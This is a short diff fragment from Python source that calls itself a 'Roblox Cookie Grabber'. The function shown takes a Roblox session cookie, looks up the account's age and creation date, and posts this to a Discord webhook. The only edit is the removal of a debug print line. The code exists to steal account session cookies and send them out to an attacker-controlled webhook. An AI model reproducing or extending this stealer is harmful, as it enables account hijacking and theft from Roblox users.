@@ -32,7 +32,6 @@ def cookiecheckerandsend(cookie, platform):
     age = robloxpy.User.External.GetAge(rid)
     crdate = robloxpy.User.External.CreationDate(rid)
 
-    print('Hi')
     discord = Discord(url=webhook)
     discord.post(
     username="ꜱᴏᴍᴇᴛʜɪɴɢ's Roblox Cookie Grabber",
